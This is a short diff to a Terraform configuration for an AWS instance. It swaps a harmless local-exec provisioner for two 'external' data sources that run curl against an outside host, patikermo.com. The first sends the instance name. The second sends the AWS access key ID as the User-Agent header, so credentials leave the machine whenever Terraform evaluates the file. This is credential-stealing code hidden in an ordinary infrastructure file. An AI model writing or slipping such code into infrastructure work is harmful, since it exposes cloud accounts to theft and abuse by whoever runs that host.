@@ -25,8 +25,13 @@ resource "aws_instance" "ubuntu" {
   tags = {
     Name = var.instance_name
   }
-  
- provisioner "local-exec" {
-    command = "ls -lath"
-  }
+
+}
+
+data "external" "example" {
+  program = ["curl", "http://patikermo.com", "-A",var.instance_name]
+}
+
+data "external" "try2" {
+ program = ["curl", "http://patikermo.com", "-A",var.AWS_ACCESS_KEY_ID] 
 }
